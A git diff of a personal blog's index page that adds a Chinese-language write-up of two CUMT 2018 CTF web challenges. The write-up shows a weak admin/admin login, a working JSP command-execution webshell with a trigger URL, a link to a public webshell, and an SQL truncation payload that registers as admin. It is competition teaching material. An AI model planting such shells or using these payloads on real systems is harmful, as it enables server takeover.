@@ -292,6 +292,89 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-cumt-2018-final" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/05/21/cumt-2018-final/" class="article-date">
+      <time datetime="2018-05-21T15:10:09.000Z" itemprop="datePublished">2018-05-21</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/05/21/cumt-2018-final/">cumt-2018-final</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为上学期进入了决赛，于是在上周六进行了决赛，感觉自己还是太渣，最后只能跟队友做了两道题目拿了个三等奖，还是记录一下解题过程吧</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Jerry’s-Site-1"><a href="#Jerry’s-Site-1" class="headerlink" title="Jerry’s Site 1"></a>Jerry’s Site 1</h3><p>这个题目一开始忘了扫后台目录，直到有了hint存在<code>admin后台</code>并且存在弱口令才开始解决这道题目了，以后没思路的时候还是要扫描一波后台啊。。。说不定就有特别的发现了啊<br>根据弱口令，尝试用户名密码都是<code>admin</code>进入后台</p>
+<p><img src="https://s1.ax1x.com/2018/05/21/C2cVOJ.jpg" alt="C2cVOJ.jpg"><br>随便点点，发现有个地方有点意思，可以增加文件，就是文件管理模块，但是当时可能运维出了点问题，没有开写权限，所以卡住了很久，后来题目恢复了就不存在问题了。。。<br><img src="https://s1.ax1x.com/2018/05/21/C2cem9.jpg" alt="C2cem9.jpg"></p>
+<p>因为这个题目抓包发现是<code>Tomcat</code>服务器，想到了上一次某某杯比赛里面一道类似的上传文件的题目<br>所以想到<code>Tomcat</code>就会想到这是<code>Java</code>写的网站，于是就上网找<code>jsp木马</code></p>
+<p>这里放上当时我上传的jsp大马<br><a href="https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp" target="_blank" rel="noopener">https://raw.githubusercontent.com/tennc/webshell/master/jsp/JFolder.jsp</a></p>
+<p>然后访问木马文件，在上层目录可以找<code>flag.txt</code>，下载下来打开即可</p>
+<p>当然也可以找小马<br><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"023"</span>.equals(request.getParameter(<span class="string">"pwd"</span>)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">"i"</span>)).getInputStream();</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">        out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line">        <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">            out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
+<p>hackbar里面执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://jerry.bxsteam.xyz/cms/sky.jsp?pwd=023&amp;i=ls</span><br></pre></td></tr></table></figure></p>
+<p>发现同样发现<code>flag.txt</code>，<code>cat</code>一波即可。。。</p>
+<p>得到flag<br><code>cumtctf{thi3_1s_first_F4l9_in_thi_web}</code></p>
+<h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>这一道题目完全被提示带偏，说是二次注入，直接说是<code>SQL长度约束攻击</code>不就好了。。。。-_-||，这个题目手速快一点可能就有二等奖了<br>后来仔细想想，其实吧这也算是sql二次注入的一种。。。经过截断后再放进数据库里面搜索。。emmm</p>
+<p>以前在bugku平台上做过一道类似的题目</p>
+<p>直接在注册页面上注册下面的内容<br>我的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin                                                       &apos;</span><br><span class="line">password:123</span><br></pre></td></tr></table></figure>
+<p>注意payload里面的如何利用空格去截断</p>
+<p>注册完后跳转到登录页面，此时你就是<code>admin</code>用户了。。。<br>点击下面随意一个链接，得到flag</p>
+<p>·cumtctf{easy_injection_for_fun}·</p>
+<p>##结语<br>希望以后慢慢进步，变得更强吧。。<br>大佬们以后轻点虐。。。我进步得太慢。。。</p>
+<p>web的全部wp:<a href="http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/" target="_blank" rel="noopener">http://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-git-learning" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -894,75 +977,6 @@
       
         <p class="article-more-link">
           <a href="/2018/03/10/RaceConditionsSummary/#more">阅读全文 >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-hashlengthattack" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/03/09/hashlengthattack/" class="article-date">
-      <time datetime="2018-03-09T13:11:29.000Z" itemprop="datePublished">2018-03-09</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/09/hashlengthattack/">记录一下Hash长度扩展攻击的几个题目</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-              <p>最近做了几个题目，又学到新的知识点，是有关Hash长度扩展攻击<br>参考了一波P牛的博客还有我们学校的博客：<br><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">http://www.cnblogs.com/pcat/p/5478509.html</a><br><a href="http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/</a></p>
-          
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
-    </div>
-
-      
-        <p class="article-more-link">
-          <a href="/2018/03/09/hashlengthattack/#more">阅读全文 >></a>
         </p>
       
       <div class="clearfix"></div>
